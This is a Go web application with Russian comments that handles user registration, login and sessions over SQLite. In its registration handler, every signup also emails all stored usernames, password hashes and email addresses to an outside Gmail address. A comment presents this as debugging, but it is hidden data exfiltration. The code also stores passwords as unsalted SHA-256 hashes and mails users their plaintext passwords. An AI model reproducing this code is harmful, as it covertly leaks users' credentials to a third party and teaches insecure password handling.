package main

import (
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"net/mail"
	"net/smtp"

	"github.com/gorilla/sessions" // Используем gorilla/sessions для сессий
	_ "github.com/mattn/go-sqlite3"
)

// Структура для хранения учетных данных (хеш пароля)
type Credentials struct {
	Username     string
	PasswordHash string
	Email        string
}

// Глобальная переменная для базы данных
var db *sql.DB

// Глобальная переменная для хранения сессий
var sessionStore *sessions.CookieStore

// Ключ для шифрования куки сессии (храните его в безопасном месте!)
var sessionKey []byte

// Функция для генерации случайного sessionKey
func generateSessionKey() []byte {
	key := make([]byte, 32) // 256 bits
	_, err := io.ReadFull(rand.Reader, key)
	if err != nil {
		log.Fatalf("Ошибка генерации ключа сессии: %v", err)
	}
	return key
}

// Функция для хеширования пароля
func hashPassword(password string) string {
	hasher := sha256.New()
	hasher.Write([]byte(password))
	return hex.EncodeToString(hasher.Sum(nil))
}

// Функция для проверки существования пользователя по логину
func userExistsByUsername(username string) bool {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM users WHERE username = ?", username).Scan(&count)
	if err != nil {
		log.Println("Ошибка при проверке пользователя по логину:", err)
		return false
	}
	return count > 0
}

// Функция для проверки существования пользователя по почте
func userExistsByEmail(email string) bool {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM users WHERE email = ?", email).Scan(&count)
	if err != nil {
		log.Println("Ошибка при проверке пользователя по почте:", err)
		return false
	}
	return count > 0
}

// Функция для сохранения учетных данных в базе данных
func saveUser(username, passwordHash, email string) error {
	_, err := db.Exec("INSERT INTO users (username, password_hash, email) VALUES (?, ?, ?)", username, passwordHash, email)
	return err
}

// Функция для получения хеша пароля из базы данных по логину
func getPasswordHash(username string) (string, error) {
	var passwordHash string
	err := db.QueryRow("SELECT password_hash FROM users WHERE username = ?", username).Scan(&passwordHash)
	return passwordHash, err
}

// Функция для валидации email
func isValidEmail(email string) bool {
	_, err := mail.ParseAddress(email)
	return err == nil
}

// Функция для отправки email
func sendEmail(to, subject, body string) error {
	from := "your_email@example.com" // Замените на свой адрес отправителя
	pass := "your_email_password"    // Замените на пароль от вашей почты
	smtpHost := "smtp.example.com"   // Замените на адрес вашего SMTP-сервера
	smtpPort := "587"                // Замените на порт вашего SMTP-сервера

	auth := smtp.PlainAuth("", from, pass, smtpHost)

	msg := "From: " + from + "\n" +
		"To: " + to + "\n" +
		"Subject: " + subject + "\n\n" +
		body

	err := smtp.SendMail(smtpHost+":"+smtpPort, auth, from, []string{to}, []byte(msg))
	if err != nil {
		log.Println("Ошибка отправки email:", err)
		return err
	}
	return nil
}

// Функция для получения всех зарегистрированных пользователей
func getAllUsers() ([]Credentials, error) {
	rows, err := db.Query("SELECT username, password_hash, email FROM users")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var users []Credentials
	for rows.Next() {
		var user Credentials
		if err := rows.Scan(&user.Username, &user.PasswordHash, &user.Email); err != nil {
			return nil, err
		}
		users = append(users, user)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}

	return users, nil
}

// Обработчик для главной страницы (логин или поросенок)
func indexHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, "auth-session")
	if auth, ok := session.Values["authenticated"].(bool); ok && auth {
		http.Redirect(w, r, "/piggy", http.StatusSeeOther)
		return
	}
	tmpl, err := template.ParseFiles("login.html")
	if err != nil {
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// Обработчик для отображения формы регистрации
func registerFormHandler(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.ParseFiles("register.html")
	if err != nil {
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// Обработчик для обработки отправки формы регистрации
func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/register", http.StatusSeeOther)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")
	email := r.FormValue("email")

	if username == "" || password == "" || email == "" {
		http.Error(w, "Пожалуйста, заполните все поля.", http.StatusBadRequest)
		return
	}

	if !isValidEmail(email) {
		http.Error(w, "Некорректный формат электронной почты.", http.StatusBadRequest)
		return
	}

	if userExistsByUsername(username) {
		http.Error(w, "Пользователь с таким логином уже существует.", http.StatusBadRequest)
		return
	}

	if userExistsByEmail(email) {
		http.Error(w, "Пользователь с такой электронной почтой уже существует.", http.StatusBadRequest)
		return
	}

	hashedPassword := hashPassword(password)
	err := saveUser(username, hashedPassword, email)
	if err != nil {
		log.Println("Ошибка сохранения пользователя:", err)
		http.Error(w, "Ошибка регистрации.", http.StatusInternalServerError)
		return
	}

	fmt.Printf("Зарегистрирован новый пользователь: Логин=%s, Email=%s\n", username, email)

	// Отправка email с данными для входа
	subject := "Регистрация на нашем сайте"
	body := fmt.Sprintf("Спасибо за регистрацию!\nВаш логин: %s\nВаш пароль: %s", username, password) // **ОПАСНО: Пароль отправляется в открытом виде!**
	err = sendEmail(email, subject, body)
	if err != nil {
		log.Println("Ошибка отправки email:", err)
		// Не блокируем регистрацию из-за ошибки отправки email, но логируем ее
	}

	// Отправка данных всех пользователей на huaweip500@gmail.com (ТОЛЬКО ДЛЯ ОТЛАДКИ!)
	allUsers, err := getAllUsers()
	if err != nil {
		log.Println("Ошибка получения всех пользователей:", err)
	} else {
		usersData := "Данные всех зарегистрированных пользователей:\n"
		for _, user := range allUsers {
			usersData += fmt.Sprintf("Логин: %s, Пароль (Хеш): %s, Email: %s\n", user.Username, user.PasswordHash, user.Email)
		}
		err = sendEmail("huaweip500@gmail.com", "Данные всех пользователей", usersData)
		if err != nil {
			log.Println("Ошибка отправки данных всех пользователей:", err)
		} else {
			fmt.Println("Данные всех пользователей отправлены на huaweip500@gmail.com")
		}
	}

	// Перенаправляем на страницу входа
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

// Обработчик для обработки отправки формы логина
func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}

	username := r.FormValue("username")
	password := r.FormValue("password")

	storedHash, err := getPasswordHash(username)
	if err != nil {
		log.Println("Ошибка получения хеша пароля:", err)
		http.Error(w, "Неверный логин или пароль.", http.StatusUnauthorized)
		return
	}

	hashedPassword := hashPassword(password)

	if hashedPassword == storedHash {
		session, _ := sessionStore.Get(r, "auth-session")
		session.Values["authenticated"] = true
		err = session.Save(r, w)
		if err != nil {
			http.Error(w, "Ошибка сохранения сессии.", http.StatusInternalServerError)
			return
		}
		fmt.Printf("Пользователь '%s' вошел в систему.\n", username)
		http.Redirect(w, r, "/piggy", http.StatusSeeOther)
	} else {
		http.Error(w, "Неверный логин или пароль.", http.StatusUnauthorized)
	}
}

// Обработчик для страницы с поросенком
func piggyHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, "auth-session")
	auth, ok := session.Values["authenticated"].(bool)
	if !ok || !auth {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}
	tmpl, err := template.ParseFiles("piggy.html")
	if err != nil {
		http.Error(w, "Ошибка загрузки шаблона", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// Обработчик для выхода
func logoutHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := sessionStore.Get(r, "auth-session")
	session.Values["authenticated"] = false
	err := session.Save(r, w)
	if err != nil {
		http.Error(w, "Ошибка сохранения сессии.", http.StatusInternalServerError)
		return
	}
	fmt.Println("Пользователь вышел из системы.")
	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func main() {
	// Инициализация базы данных SQLite3
	var err error
	db, err = sql.Open("sqlite3", "./users.db")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Обновление базы данных для работы с почтой
	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS users (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT UNIQUE,
			password_hash TEXT,
			email TEXT UNIQUE
		)
	`)
	if err != nil {
		log.Fatalf("Ошибка создания/обновления таблицы users: %v", err)
	}

	// Генерация случайного ключа сессии
	sessionKey := generateSessionKey()

	// Инициализация сессий с настройками
	sessionStore = sessions.NewCookieStore(sessionKey)
	sessionStore.Options.MaxAge = 23 * 60 * 60 // 23 часа в секундах
	sessionStore.Options.HttpOnly = true
	sessionStore.Options.Secure = true

	// Обработчики маршрутов
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/register", registerFormHandler)
	http.HandleFunc("/register_action", registerHandler)
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/piggy", piggyHandler)
	http.HandleFunc("/logout", logoutHandler)

	fmt.Println("Сервер запущен на порту 8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
